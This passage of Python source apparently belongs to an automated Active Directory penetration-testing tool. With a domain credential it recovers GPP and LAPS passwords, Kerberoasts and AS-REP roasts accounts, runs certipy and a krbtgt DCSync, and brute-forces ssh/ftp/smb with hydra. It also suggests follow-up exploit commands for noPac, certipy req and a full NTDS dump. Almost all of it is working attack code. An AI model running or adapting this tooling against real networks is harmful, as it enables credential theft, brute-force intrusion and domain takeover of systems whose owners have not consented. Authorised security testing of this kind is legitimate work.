            # existe en un SMB/Samba suelto). Fallo de higiene clásico (MS14-025): hasta 2014
            # Windows dejaba empujar contraseñas por GPO cifradas en XML dentro de SYSVOL con
            # una clave AES que Microsoft PUBLICÓ — cualquier cuenta de dominio puede leer
            # SYSVOL, así que basta la MISMA credencial que acaba de validarse. SOLO LECTURA:
            # nxc busca y descifra, no escribe nada. gpp_password mira Groups.xml (cuentas
            # locales/servicio empujadas por GPO); gpp_autologin mira Registry.xml
            # (DefaultUsername/DefaultPassword del autologon de Windows). Formato de salida
            # confirmado en el código fuente de nxc (nxc/modules/gpp_password.py): con hallazgo
            # imprime "Found credentials in <ruta>"; sin hallazgo no imprime nada más que el
            # aviso de búsqueda — de ahí el regex, no un parseo de campos.
            if is_dc:
                for mod, label in (("gpp_password", "GPP cpassword (Groups.xml)"),
                                    ("gpp_autologin", "GPP autologon (Registry.xml)")):
                    rc, out = _run_capture_retry([nxc, "smb", ip] + A() + ["-M", mod], timeout=120, quiet=True)
                    hit = bool(re.search(r"Found credentials in", out or ""))
                    _step(res, f"{nxc} smb {ip} {shown_auth} -M {mod}", hit, mask(out),
                          note=f"{label}: contraseñas que quedaron en SYSVOL cifradas con la clave AES PÚBLICA "
                               "de MS14-025 — SOLO LECTURA, descifra sin escribir nada")
                    if hit:
                        res["findings"].append(("alta",
                            f"SMB (cred {u}): {label} — contraseña recuperada de SYSVOL (revisa la salida "
                            f"cruda del paso '-M {mod}')"))
                # noPac / "Sam the Admin" (CVE-2021-42278 + CVE-2021-42287): con CUALQUIER cuenta
                # de dominio válida (no hace falta admin) nxc pide un TGT con y sin PAC y compara
                # tamaños — si el DC no valida bien el nombre de la máquina (machineAccountQuota
                # por defecto permite crear una), el TGT sin PAC sale más corto y es posible
                # suplantar un DC → de ahí, Domain Admin. Formato de salida confirmado en el código
                # fuente de nxc (nxc/modules/nopac.py): con hallazgo hace
                # context.log.highlight("VULNERABLE") (mayúsculas, sin más texto alrededor).
                rc, out = _run_capture_retry([nxc, "smb", ip] + A() + ["-M", "nopac"], timeout=120, quiet=True)
                npvuln = "VULNERABLE" in (out or "")
                _step(res, f"{nxc} smb {ip} {shown_auth} -M nopac", npvuln, mask(out),
                      note="noPac (CVE-2021-42278/42287): ¿puede esta cuenta de dominio estándar suplantar "
                           "a un DC y escalar directamente a Domain Admin?")
                if npvuln:
                    res["findings"].append(("critica",
                        f"SMB (cred {u}): ¡noPac! DC vulnerable a CVE-2021-42278/42287 — impersonar Domain "
                        "Admin desde una cuenta de dominio estándar"))
                    res["next"].append(
                        "git clone https://github.com/Ridter/noPac && python3 noPac/noPac.py "
                        f"DOMINIO/{shlex.quote(u)}:*** -dc-ip {ip} -dc-host DC_HOSTNAME --impersonate "
                        "administrator -use-ldap   # explota noPac (confirmado arriba) — paso MANUAL")
        elif np == "ldap":
            for mod, note in (("--users", "usuarios del dominio por LDAP (con credencial: lista completa)"),
                              ("--groups", "grupos del dominio (Domain Admins, delegaciones)"),
                              ("--pass-pol", "política de contraseñas del dominio"),
                              ("--admin-count", "cuentas protegidas (adminCount=1): objetivos de alto valor"),
                              ("--trusted-for-delegation", "cuentas/equipos con delegación sin restricción (ruta a Domain Admin)"),
                              ("--password-not-required", "cuentas con PASSWD_NOTREQD (login sin contraseña)")):
                rc, out = _run_capture_retry([nxc, "ldap", ip] + A() + [mod], timeout=120, quiet=True)
                _step(res, f"{nxc} ldap {ip} {shown_auth} {mod}", rc == 0, mask(out), note=note)
                _surface_ad_enum(res, u, mod, out, base, seen)
            # Membresía de los grupos que dan el dominio: '--groups "Domain Admins"' imprime SUS
            # MIEMBROS (el '--groups' de arriba, sin argumento, solo lista grupos con su recuento).
            # Saber QUIÉN es Domain/Enterprise Admin con una credencial ya validada enfoca el resto
            # del ataque (a quién suplantar/kerberoastear). Solo lectura. Enterprise Admins solo
            # existe en el dominio raíz del bosque: en un dominio hijo nxc dice 'not found' y
            # _parse_nxc_group_members lo descarta (sin ruido).
            if is_dc:
                for grp in ("Domain Admins", "Enterprise Admins"):
                    rc, out = _run_capture_retry([nxc, "ldap", ip] + A() + ["--groups", grp], timeout=90, quiet=True)
                    members = _parse_nxc_group_members(out)
                    _step(res, f'{nxc} ldap {ip} {shown_auth} --groups {shlex.quote(grp)}', bool(members), mask(out),
                          note=f"miembros del grupo '{grp}' (quién controla el dominio) — solo lectura")
                    if members:
                        _add_once(res, "alta",
                                  f"AD (cred {u}): '{grp}' — {len(members)} miembro(s): "
                                  + ", ".join(members[:15]) + (" …" if len(members) > 15 else ""),
                                  f"miembros {grp}", seen)
                # MachineAccountQuota: ¿cuántas cuentas de equipo puede unir al dominio ESTA
                # cuenta (o cualquier otra, ya que es el valor del atributo del dominio, no por
                # usuario)? MAQ>0 es la precondición de noPac/RBCD/Shadow Credentials — todos
                # necesitan poder crear una cuenta de máquina propia. Repetido aquí (fp_ldap ya
                # lo intenta por bind anónimo) por si el anónimo estaba deshabilitado.
                rc, out = _run_capture_retry([nxc, "ldap", ip] + A() + ["-M", "maq"], timeout=60, quiet=True)
                maq_f = _maq_finding(_parse_maq(out), prefix=f"AD (cred {u})")
                _step(res, f"{nxc} ldap {ip} {shown_auth} -M maq", maq_f is not None, mask(out),
                      note="MachineAccountQuota: ¿cuántas cuentas de equipo puede unir al dominio una cuenta cualquiera? (precondición de noPac/RBCD/Shadow Credentials)")
                if maq_f:
                    _add_once(res, maq_f[0], maq_f[1], "MachineAccountQuota", seen)
                # Trusts de dominio/bosque: con una credencial YA validada (bind simple sobre
                # LDAP, no SASL) se lee donde el anónimo de fp_ldap casi nunca llega. nxc NO
                # tiene un flag '--trusts' (confirmado leyendo su código fuente: el método que
                # enumera trustedDomain existe en nxc/protocols/ldap.py pero no lo llama ningún
                # argumento de CLI) — se usa ldapsearch, ya dependencia existente de palantir.
                # Solo con SECRETO EN CLARO (ldapsearch no soporta pass-the-hash) — con -H (hash)
                # se salta. La contraseña va por -y FICHERO (0600, el mismo sec_file de nxc -p),
                # nunca en el argv/ps.
                if domain and sec_file and have("ldapsearch"):
                    base_dn = ",".join(f"dc={p}" for p in domain.split("."))
                    rc, tout = _run_capture_retry(
                        ["ldapsearch", "-x", "-H", f"ldap://{ip}", "-D", f"{u}@{domain}", "-y", sec_file.name,
                         "-b", base_dn, "(objectClass=trustedDomain)", "trustPartner", "trustDirection",
                         "trustType", "trustAttributes"], timeout=20, quiet=True)
                    tshown = (f"ldapsearch -x -H ldap://{ip} -D {shlex.quote(u + '@' + domain)} -y *** "
                              f"-b {shlex.quote(base_dn)} '(objectClass=trustedDomain)'")
                    trusts = _parse_ldap_trusts(tout)
                    _step(res, tshown, bool(trusts), mask(tout),
                          note="trusts de dominio/bosque con esta credencial (topología para movimiento lateral entre dominios)")
                    for t in trusts:
                        scope = "TODO el bosque" if t["forest_transitive"] else "solo este dominio"
                        _add_once(res, "info",
                                  f"AD (cred {u}): trust con '{t['partner']}' — {t['direction']}, {t['type']}, alcance: {scope}",
                                  f"trust {t['partner']}", seen)
            # get-desc-users: contraseñas filtradas en el campo "description" de las cuentas
            # (fallo de higiene clásico en AD). fp_ldap ya lo ejecuta, pero SOLO tras un bind
            # anónimo — si el anónimo está deshabilitado (lo normal en un AD mínimamente
            # endurecido) y el operador pasa -u/-p, este chequeo nunca llegaba a correr. Mismo
            # regex genérico que el spider de contenido (_SPIDER_SECRET_REGEX) sobre el output
            # crudo, por la misma razón que en fp_ldap: no hay formato de salida documentado.
            rc, out = _run_capture_retry([nxc, "ldap", ip] + A() + ["-M", "get-desc-users"], timeout=90, quiet=True)
            desc_hit = bool(re.search(_SPIDER_SECRET_REGEX, out or "", re.I))
            _step(res, f"{nxc} ldap {ip} {shown_auth} -M get-desc-users", desc_hit, mask(out),
                  note="busca contraseñas en el campo 'description' de las cuentas de usuario (fallo de higiene clásico en AD)")
            if desc_hit:
                res["findings"].append(("alta",
                    f"LDAP (cred {u}): la descripción de algún usuario podría contener una contraseña — "
                    "revisa la salida cruda del paso 'get-desc-users'"))
            # LAPS: ¿puede ESTA credencial leer la contraseña de administrador local que LAPS
            # rota automáticamente (atributo ms-Mcs-AdmPwd / msLAPS-Password)? Por diseño solo
            # debería poder un grupo reducido (el propio LAPS la protege con ACLs dedicadas) —
            # si cualquier cuenta de dominio puede leerla, LAPS está desplegado pero mal
            # delegado, y es tan grave como no tener LAPS: da el admin local de la máquina (y a
            # menudo REUTILIZADO en más de una, si el despliegue no es por máquina). SOLO
            # LECTURA (atributo LDAP), nxc no escribe nada. Formato de salida confirmado en el
            # código fuente de nxc (nxc/modules/laps.py): "Computer:<nombre> User:<usuario>
            # Password:<contraseña>" por cada equipo legible.
            rc, out = _run_capture_retry([nxc, "ldap", ip] + A() + ["-M", "laps"], timeout=90, quiet=True)
            laps_hits = _parse_laps_hits(out)
            _step(res, f"{nxc} ldap {ip} {shown_auth} -M laps", bool(laps_hits), mask(out),
                  note="LAPS: ¿esta credencial puede leer la contraseña de administrador local que LAPS rota "
                       "automáticamente? Debería poder muy poca gente — SOLO LECTURA (atributo LDAP)")
            if laps_hits:
                comps = ", ".join(c for c, _pw in laps_hits[:5])
                res["findings"].append(("critica",
                    f"LDAP (cred {u}): LAPS legible — {len(laps_hits)} contraseña(s) de administrador local "
                    f"recuperada(s): {comps}{' …' if len(laps_hits) > 5 else ''}"))
            # Roasting: hashes crackeables offline → el mayor premio de tener UNA credencial de
            # dominio. Se vuelca a fichero en la carpeta del objetivo, listo para hashcat.
            # Kerberoast: con impacket-GetUserSPNs en vez de nxc --kerberoasting (mismo pedido
            # explícito del operador que el AS-REP de más abajo — "que sea con
            # impacket-getuserspn"). '-request' pide TGS para TODAS las cuentas con SPN del
            # dominio y las vuelca de una vez (mismo patrón que GetNPUsers -request para
            # AS-REP). Fichero renombrado de 'kerb_nxc.txt' a 'kerb.txt' — ya no lo escribe nxc.
            getuserspns = _impacket_suggest_bin("GetUserSPNs")
            kerb_outfile = str(base / "kerb.txt") if base else "kerb.txt"
            if domain:
                k_auth = ["-hashes", f"{_LM_HASH_EMPTY}:{secret}"] if is_hash else []
                k_ident = f"{domain}/{u}:{'' if is_hash else (secret or '')}"
                rc, out = _run_capture_retry(
                    [getuserspns, k_ident] + k_auth + ["-request", "-dc-ip", ip, "-outputfile", kerb_outfile],
                    timeout=90, quiet=True)
                n = _count_roast(out)
                k_shown = (f"{getuserspns} {domain}/{shlex.quote(u)}:{'***' if (secret and not is_hash) else ''} "
                           + ("-hashes *** " if is_hash else "")
                           + f"-request -dc-ip {ip} -outputfile {kerb_outfile}")
                _step(res, k_shown, n > 0, mask(out),
                      note="Kerberoast (cuentas con SPN): TGS para TODAS las cuentas con SPN del dominio — "
                           "vuelca hashes crackeables con hashcat/john")
                if n:
                    res["findings"].append(("alta", f"LDAP (cred {u}): {n} hash(es) de Kerberoast (cuentas con SPN) → {kerb_outfile} (crackear con hashcat)"))
            else:
                res["next"].append(
                    f"{getuserspns} DOMINIO/{shlex.quote(u)}:'<pass>' -request -dc-ip {ip} -outputfile {kerb_outfile}   "
                    "# Kerberoast (todas las cuentas con SPN) — dominio aún no confirmado en este punto, "
                    "sustituye DOMINIO")
            # AS-REP roast: con impacket-GetNPUsers en vez de nxc --asreproast (pedido explícito
            # del operador, tras revisar un run real: el .txt salía bien con nxc, pero prefiere
            # la herramienta de referencia del propio ataque). '-request' le pide al DC por LDAP
            # TODAS las cuentas con DONT_REQ_PREAUTH y las vuelca de una vez — a diferencia del
            # GetNPUsers -no-pass/-usersfile de más arriba (sin credenciales, limitado a adivinar
            # nombres de una wordlist), esta vía AUTENTICADA no depende de haber acertado antes
            # ningún nombre de cuenta: encuentra TODAS las roasteables del dominio, conocidas o
            # no. Fichero de salida renombrado de 'asrep_nxc.txt' a 'asrep.txt' — ya no lo
            # escribe nxc, así que el sufijo quedaba mal puesto.
            getnpusers = _impacket_suggest_bin("GetNPUsers")
            asrep_outfile = str(base / "asrep.txt") if base else "asrep.txt"
            if domain:
                g_auth = ["-hashes", f"{_LM_HASH_EMPTY}:{secret}"] if is_hash else []
                g_ident = f"{domain}/{u}:{'' if is_hash else (secret or '')}"
                rc, out = _run_capture_retry(
                    [getnpusers, g_ident] + g_auth + ["-request", "-dc-ip", ip, "-outputfile", asrep_outfile],
                    timeout=90, quiet=True)
                n = _count_roast(out)
                g_shown = (f"{getnpusers} {domain}/{shlex.quote(u)}:{'***' if (secret and not is_hash) else ''} "
                           + ("-hashes *** " if is_hash else "")
                           + f"-request -dc-ip {ip} -outputfile {asrep_outfile}")
                _step(res, g_shown, n > 0, mask(out),
                      note="AS-REP (cuentas sin preauth): consulta LDAP directa por TODAS las roasteables del "
                           "dominio (no depende de wordlist) — vuelca hashes crackeables con hashcat/john")
                if n:
                    res["findings"].append(("alta", f"LDAP (cred {u}): {n} hash(es) de AS-REP (cuentas sin preauth) → {asrep_outfile} (crackear con hashcat)"))
            else:
                res["next"].append(
                    f"{getnpusers} DOMINIO/{shlex.quote(u)}:'<pass>' -request -dc-ip {ip} -outputfile {asrep_outfile}   "
                    "# AS-REP roast autenticado (todas las cuentas sin preauth, no depende de wordlist) — "
                    "dominio aún no confirmado en este punto, sustituye DOMINIO")
            # AD CS (Certipy): SOLO LECTURA — 'certipy find -vulnerable' enumera CAs y
            # plantillas de certificados vía LDAP con la MISMA credencial que acaba de
            # validarse, marcando plantillas ESC1-8 (ataque de escalada MÁS corto a Domain
            # Admin cuando hay AD CS mal configurado). No escribe nada en el AD. El paso
            # siguiente si encuentra algo vulnerable ('certipy req'/'certipy shadow' — pedir
            # o fabricar un certificado) SÍ es una escalada activa, igual de cualitativa que
            # el volcado de NTDS (ver "Pendiente" en MEJORAS.md): palantir NUNCA lo encadena
            # solo, queda como sugerencia manual en 'next' con el nombre real de CA/plantilla
            # a rellenar de la salida de 'certipy find'.
            certipy = certipy_bin()
            if certipy and domain:
                auth_c = ["-hashes", secret] if is_hash else ["-p", secret or ""]
                # OJO: a diferencia de nxc, certipy no admite la contraseña por fichero — va
                # literal en el argv mientras el proceso corre (visible por ps aux/
                # /proc/<pid>/cmdline durante esos segundos), inevitable con la interfaz de
                # certipy. Se enmascara igual en lo que queda GUARDADO (informe/commands.log).
                rc, out = _run_capture_retry(
                    [certipy, "find", "-u", f"{u}@{domain}"] + auth_c +
                    ["-dc-ip", ip, "-vulnerable", "-stdout", "-silent"], timeout=120, quiet=True)
                cshown = f"certipy find -u {shlex.quote(u + '@' + domain)} {shown_sec} -dc-ip {ip} -vulnerable -stdout"
                _step(res, cshown, rc == 0, mask(out),
                      note="AD CS: plantillas de certificados vulnerables (ESC1-8) vía LDAP, sin escribir nada")
                escs = sorted(set(re.findall(r"ESC\d+", out or "")))
                if escs:
                    res["findings"].append(("critica",
                        f"AD CS: plantilla(s) vulnerable(s) {', '.join(escs)} — revisa la salida cruda de 'certipy "
                        "find'; 'certipy req' pide el certificado de la plantilla afectada (paso MANUAL, no se encadena solo)"))
                    res["next"].append(
                        f"certipy req -u {shlex.quote(u + '@' + domain)} {shown_sec} -ca CA_NAME -template TEMPLATE "
                        f"-dc-ip {ip}   # pide el certificado de la plantilla vulnerable ({escs[0]}) — sustituye "
                        "CA_NAME/TEMPLATE por los nombres reales de la salida de 'certipy find' (paso MANUAL)")
                elif re.search(r"Certificate Authorities", out or ""):
                    res["findings"].append(("info", "AD CS presente (hay CA) pero 'certipy find -vulnerable' no marcó plantillas vulnerables evidentes"))
            elif certipy and not domain:
                res["next"].append(
                    f"certipy find -u {shlex.quote(u)}@DOMINIO {shown_sec} -dc-ip {ip} -vulnerable -stdout   # "
                    "AD CS: plantillas vulnerables (ESC1-8) — dominio aún no confirmado en este punto, sustituye DOMINIO")
            else:
                res["missing"].append("certipy")
            # DCSync-rights check: ¿tiene esta cuenta los derechos de replicación
            # (DS-Replication-Get-Changes + -All) que hacen falta para un DCSync? En vez de
            # parsear el ACL del dominio (SECURITY_DESCRIPTOR binario, caro de decodificar en
            # Python puro), se comprueba el derecho DIRECTAMENTE intentando el propio DCSync —
            # pero SOLO de la cuenta krbtgt (-just-dc-user), no el NTDS completo: es la MISMA
            # diferencia cualitativa que ya separa LAPS/certipy (solo lectura puntual) del
            # volcado de NTDS que palantir nunca encadena solo (ver comentario de certipy
            # arriba y "Pendiente" en MEJORAS.md) — aquí se confirma el derecho con UN hash,
            # no se vacía el dominio entero. Sin derechos, secretsdump falla limpio
            # (RPC_S_ACCESS_DENIED) y no imprime la línea de krbtgt.
            secretsdump = _secretsdump_bin()
            if secretsdump and domain:
                auth_s = ["-hashes", secret] if is_hash else []
                real_target = f"{domain}/{u}:{'' if is_hash else (secret or '')}@{ip}"
                shown_target = f"{domain}/{shlex.quote(u)}:{'' if is_hash else '***'}@{ip}"
                shown_hs = "-hashes *** " if is_hash else ""
                rc, out = _run_capture_retry(
                    [secretsdump] + auth_s + ["-just-dc-user", "krbtgt", "-target-ip", ip, real_target],
                    timeout=90, quiet=True)
                krbtgt_hash = _secretsdump_hash(out, "krbtgt")
                # El nombre MOSTRADO (step y next) es el MISMO binario ya resuelto arriba
                # (`secretsdump`), no un "secretsdump.py" fijo — bug real confirmado por un
                # operador en Kali: el paso que de verdad se ejecutó usa el binario correcto
                # (impacket-secretsdump, ahí resuelto), pero el texto mostrado/sugerido decía
                # siempre "secretsdump.py", un nombre que ese Kali no tiene instalado así.
                _step(res, f"{secretsdump} {shown_hs}-just-dc-user krbtgt -target-ip {ip} {shown_target}",
                      bool(krbtgt_hash), mask(out),
                      note="DCSync: ¿tiene esta credencial derechos de replicación (DS-Replication-Get-Changes"
                           "[-All])? Solo se pide el hash de krbtgt (no el NTDS completo) para confirmar el "
                           "derecho sin hacer el volcado masivo")
                if krbtgt_hash:
                    res["findings"].append(("critica",
                        f"LDAP (cred {u}): ¡DCSync permitido! hash de krbtgt recuperado ({krbtgt_hash}). "
                        "Con él: Golden Ticket (ticketer.py) o volcado COMPLETO de NTDS (paso MANUAL)"))
                    res["next"].append(
                        f"{secretsdump} {shown_hs}-just-dc {shown_target}   # DCSync confirmado arriba: "
                        "vuelca TODO NTDS (paso MANUAL, no se encadena solo — ver MEJORAS.md)")
            elif secretsdump and not domain:
                res["next"].append(
                    f"{secretsdump} -just-dc-user krbtgt DOMINIO/{shlex.quote(u)}:*** @{ip}   # DCSync-rights "
                    "check — dominio aún no confirmado en este punto, sustituye DOMINIO")
            else:
                res["missing"].append("impacket-secretsdump")
            # adidnsdump: vuelca el DNS interno del dominio vía LDAP con la MISMA credencial —
            # no depende de que la zona permita AXFR (fp_dns_nameservers sí, y suele fallar
            # contra un DC bien configurado); con una cuenta de dominio cualquiera basta para
            # leer los registros vía LDAP. Flags/formato de salida confirmados en el código
            # fuente de adidnsdump (dnsdump.py): '-p' acepta contraseña O hash 'LM:NT', y
            # vuelca a '--outfile' en 'type,name,value' (sin cabecera "éxito" parseable más
            # allá de contar filas del CSV resultante).
            adidnsdump = _adidnsdump_bin()
            if adidnsdump and domain:
                dns_outfile = str(base / "adidnsdump_records.csv") if base else "adidnsdump_records.csv"
                adns_user = f"{domain}\\{u}"
                adns_pw = f"{_LM_HASH_EMPTY}:{secret}" if is_hash else (secret or "")
                _run_capture_retry(
                    [adidnsdump, "-u", adns_user, "-p", adns_pw, "--outfile", dns_outfile, f"ldap://{ip}"],
                    timeout=90, quiet=True)
                dns_recs = []
                try:
                    with open(dns_outfile, encoding="utf-8") as fh:
                        dns_recs = _parse_adidnsdump_csv(fh.read())
                except OSError:
                    pass
                adns_shown = f"adidnsdump -u {shlex.quote(adns_user)} -p *** --outfile {dns_outfile} ldap://{ip}"
                _step(res, adns_shown, bool(dns_recs), f"{len(dns_recs)} registro(s) en {dns_outfile}",
                      note="DNS interno del dominio vía LDAP (no depende de AXFR) — equipos/servicios que ni "
                           "nmap ni el footprint pasivo habían visto")
                if dns_recs:
                    sample = ", ".join(f"{t} {n}" for t, n, _v in dns_recs[:8])
                    more = f" (+{len(dns_recs) - 8} más)" if len(dns_recs) > 8 else ""
                    res["findings"].append(("info",
                        f"LDAP (cred {u}): adidnsdump — {len(dns_recs)} registro(s) DNS interno(s) → {dns_outfile} — {sample}{more}"))
            elif adidnsdump and not domain:
                res["next"].append(
                    f"adidnsdump -u DOMINIO\\\\{shlex.quote(u)} -p *** ldap://{ip}   # DNS interno vía LDAP — "
                    "dominio aún no confirmado en este punto, sustituye DOMINIO")
            else:
                res["missing"].append("adidnsdump")
            # Con UNA credencial de dominio válida, el siguiente paso de oro es BloodHound
            # (rutas de ataque a Domain Admin). Solo sugerencia (PASS placeholder, no el secreto).
            res["next"].append(f"nxc ldap {ip} -u {shlex.quote(u)} -p PASS --bloodhound -c All --dns-server {ip}   # recolecta para BloodHound (rutas a Domain Admin)")
    finally:
        if sec_file:
            try:
                os.unlink(sec_file.name)
            except OSError:
                pass


# ── Fuerza bruta de LISTAS con hydra (ssh/ftp/smb) — Fase 5d ──────────────────────
# El brute de listas (-U/-P) lo hace hydra en ssh/ftp/smb: es bastante más rápido que nxc
# y NO sufre el bug de paramiko que nxc tiene por SSH (banner/reset). nxc se queda para el
# resto de protocolos, para pass-the-hash (hydra no lo hace), si hydra no está instalado, y
# SIEMPRE para la enumeración CON una credencial ya válida (--shares/--sam/--users/roasting).
_HYDRA_SPRAY_PROTOS = {"ssh", "ftp", "smb"}
_HYDRA_SERVICE = {"ssh": "ssh", "ftp": "ftp", "smb": "smb2"}   # SMB→smb2 (SMBv2/3; el módulo smb=v1 ya no aplica a Samba/Windows modernos)
_HYDRA_THREADS = {"ssh": "4", "ftp": "4"}   # SSH y FTP (ProFTPD) cortan conexiones en paralelo → -t 4 evita «too many connection errors»/banner/reset (resto: por defecto de hydra, 16)


def hydra_bin():
    """hydra (THC): apt lo pone en el PATH; una instalación manual podría caer en ~/.local/bin."""
    return _bin_with_sudo_fallback(("hydra",), home_dirs=(".local/bin",))


def _parse_hydra_hits(out):
    """Aciertos de hydra: líneas '[PORT][service] host: IP [misc: …] login: U password: P'.
    Los módulos ssh/smb meten un campo 'misc: (null)' ENTRE host y login (p. ej.
    '[22][ssh] host: 10.0.0.1   misc: (null)   login: robin   password: x'), así que el regex
    salta cualquier cosa entre el tag y 'login:' en vez de exigir 'host: IP' pegado a 'login:'
    (si no, se perdían TODOS los aciertos de ssh/smb). Devuelve [{"user","password","pwn3d"}]
    — pwn3d siempre False aquí (hydra solo valida el login, no dice si es admin; para SMB lo
    confirma nxc después)."""
    hits = []
    for line in out.splitlines():
        m = re.search(r"\[\d+\]\[[^\]]+\].*?login:\s+(.+?)\s+password:\s+(.*\S)\s*$", line)
        if m:
            hits.append({"user": m.group(1), "password": m.group(2), "pwn3d": False})
    return hits


def _nxc_confirm_smb(nxc, ip, user, password, port, dp, local_auth):
    """Confirma UNA credencial SMB con nxc (ground truth: distingue el login real del
    guest-mapping de Samba) y dice si es admin (Pwn3d!). Contraseña por fichero 0600, nunca
    en el argv. Devuelve (ok, pwn3d)."""
    import tempfile
    pf = tempfile.NamedTemporaryFile("w", delete=False, suffix=".pw")
    pf.write((password or "") + "\n")
    pf.close()
    os.chmod(pf.name, 0o600)
    try:
        cmd = [nxc, "smb", ip, "-u", user, "-p", pf.name]
        if local_auth and "smb" in _NXC_LOCAL_AUTH_PROTOS:
            cmd.append("--local-auth")
        if port and dp and port != dp:
            cmd += ["--port", str(port)]
        rc, out = run_capture(cmd, timeout=40, quiet=True)
    finally:
        try:
            os.unlink(pf.name)
        except OSError:
            pass
    out = out or ""
    ok = _nxc_ok(out) and "(Guest)" not in out   # (Guest) = guest-mapping, no es un login real
    return ok, bool(re.search(r"\(Pwn3d!\)", out))


def _nxc_bulk(res, np, ip, port, dp, bulk_users, bulk_passwords, no_bf, nxc, is_hash, local_auth):
    """Spray de listas por nxc (fallback: protocolo que hydra no cubre, pass-the-hash, o hydra
    ausente). Escribe las dos listas a fichero (secreto nunca en argv), lanza UN nxc con -u/-p
    de fichero + --continue-on-success, parsea los '[+]' y registra el paso con la contraseña
    enmascarada. Devuelve [{"user","password","pwn3d"}]."""
    import tempfile
    uf = tempfile.NamedTemporaryFile("w", delete=False, suffix=".users")
    uf.write("\n".join(bulk_users) + "\n")
    uf.close()
    pf = tempfile.NamedTemporaryFile("w", delete=False, suffix=".pw")
    pf.write("\n".join(bulk_passwords) + "\n")
    pf.close()
    os.chmod(pf.name, 0o600)
    try:
        sec_flag = "-H" if is_hash else "-p"
        cmd = [nxc, np, ip, "-u", uf.name, sec_flag, pf.name, "--continue-on-success"]
        if no_bf:
            cmd.append("--no-bruteforce")
        if local_auth and np in _NXC_LOCAL_AUTH_PROTOS:
            cmd.append("--local-auth")
        if port and dp and port != dp:
            cmd += ["--port", str(port)]
        n = len(bulk_users) if no_bf else len(bulk_users) * len(bulk_passwords)
        timeout = min(7200, max(120, round(n * 1.5)))
        rc, out = run_capture(cmd, timeout=timeout, quiet=True)
    finally:
        for fn in (uf.name, pf.name):
            try:
                os.unlink(fn)
            except OSError:
                pass
    shown = (f"{nxc} {np} {ip} -u <{len(bulk_users)} usuarios> "
             f"{'-H' if is_hash else '-p'} <{len(bulk_passwords)} {'hashes' if is_hash else 'contraseñas'}> --continue-on-success")
    if no_bf:
        shown += " --no-bruteforce"
    if local_auth and np in _NXC_LOCAL_AUTH_PROTOS:
        shown += " --local-auth"
    if port and dp and port != dp:
        shown += f" --port {port}"
    safe_out = out or ""
    for pw in bulk_passwords:   # se enmascara también el hash: tan reutilizable como la contraseña
        if pw:
            safe_out = safe_out.replace(pw, "***")
    hits = _parse_nxc_bulk_successes(out or "")
    _step(res, shown, bool(hits), safe_out,
          note=f"spray en bloque por {np.upper()} ({n} combinaciones, 1 proceso nxc)")
    return hits


def _hydra_bulk(res, np, ip, port, dp, bulk_users, bulk_passwords, no_bf, nxc, local_auth):
    """Spray de listas por HYDRA (ssh/ftp/smb): más rápido que nxc y sin su bug de paramiko
    por SSH. Listas a fichero (secreto nunca en argv), lanza hydra, parsea los aciertos y
    registra el paso con la contraseña enmascarada. Devuelve [{"user","password","pwn3d"}].

    Casos especiales vistos en objetivos reales:
      · SSH solo-publickey: hydra dice 'does not support password authentication (method
        reply N)'. No es error: se informa y el brute por contraseña no aplica (sin hits).
      · SMB con Samba que mapea cualquier usuario a invitado: hydra avisa 'might accept any
        credential' y da TODO por válido (falso positivo) → no nos fiamos y caemos a nxc.
      · SMB normal: cada acierto de hydra se CONFIRMA con nxc (para saber si es admin -Pwn3d-
        y poder encadenar el volcado SAM/LSA; hydra no lo dice)."""
    import tempfile
    hy = hydra_bin()
    service = _HYDRA_SERVICE[np]
    uf = tempfile.NamedTemporaryFile("w", delete=False, suffix=".users")
    uf.write("\n".join(bulk_users) + "\n")
    uf.close()
    pf = cf = None
    if no_bf:
        # hydra no tiene modo "zip" de -L/-P: se emparejan 1:1 con -C user:pass
        cf = tempfile.NamedTemporaryFile("w", delete=False, suffix=".combo")
        cf.write("\n".join(f"{u}:{p}" for u, p in zip(bulk_users, bulk_passwords)) + "\n")
        cf.close()
        os.chmod(cf.name, 0o600)
    else:
        pf = tempfile.NamedTemporaryFile("w", delete=False, suffix=".pw")
        pf.write("\n".join(bulk_passwords) + "\n")
        pf.close()
        os.chmod(pf.name, 0o600)
    # SMB en puerto NO estándar (445 por defecto) también necesita ":puerto" — antes se omitía
    # SIEMPRE para smb2 (a diferencia de ssh/ftp), así que hydra atacaba el 445 por defecto
    # aunque el servicio real estuviera en otro puerto, y fallaba en silencio contra el SMB de
    # verdad (falso negativo "sin credenciales").
    tgt = f"{service}://{ip}:{port}" if port else f"{service}://{ip}"
    try:
        if cf:
            cmd = [hy, "-C", cf.name, "-I", tgt]
        else:
            cmd = [hy, "-L", uf.name, "-P", pf.name, "-I", tgt]
        if np in _HYDRA_THREADS:
            cmd += ["-t", _HYDRA_THREADS[np]]
        n = len(bulk_users) if no_bf else len(bulk_users) * len(bulk_passwords)
        timeout = min(7200, max(120, round(n * (3 if np == "ssh" else 1))))
        rc, out = run_capture(cmd, timeout=timeout, quiet=True)
    finally:
        for fn in (uf.name, pf.name if pf else None, cf.name if cf else None):
            if fn:
                try:
                    os.unlink(fn)
                except OSError:
                    pass
    out = out or ""
    shown = ("hydra " + ("-C <pares>" if no_bf
             else f"-L <{len(bulk_users)} usuarios> -P <{len(bulk_passwords)} contraseñas>")
             + f" -I {tgt}")
    if np in _HYDRA_THREADS:
        shown += f" -t {_HYDRA_THREADS[np]}"
    safe_out = out
    for pw in bulk_passwords:
        if pw:
            safe_out = safe_out.replace(pw, "***")
    hits = _parse_hydra_hits(out)
    conn_errors = any(s in out for s in ("too many connection errors", "all children were disabled",
                                         "could not connect", "No route to host"))
    # SMB que mapea cualquier credencial a invitado (guest, `map to guest = Bad User`): hydra da
    # TODO por válido (falso positivo) → no distingue el login real. NO se omite: se reintenta con
    # nxc --local-auth, que hace autenticación LOCAL real (contra el SAM) e IGNORA el guest-mapping,
    # así que saca el login verdadero (p. ej. una cuenta como 'jason' cuya contraseña SÍ está en la
    # lista). Es más lento (nxc itera la lista), pero es la única forma fiable en un Samba así —
    # omitirlo (lo que hacía antes) se dejaba sin probar esa cuenta.
    if np == "smb" and "might accept any credential" in out.lower():
        _step(res, shown, False, safe_out,
              note="spray SMB por hydra NO fiable — el servidor mapea cualquier usuario a invitado («might "
                   "accept any credential»): todo sale «válido». Reintento con nxc --local-auth (auth local "
                   "real, ignora el guest-mapping)")
        res["findings"].append(("info",
            "SMB: el servidor mapea cualquier credencial a invitado (guest) → hydra no puede distinguir el "
            "login real; se reintenta el brute con nxc --local-auth (autenticación LOCAL real). Puede tardar."))
        return _nxc_bulk(res, "smb", ip, port, dp, bulk_users, bulk_passwords, no_bf, nxc, False, True)
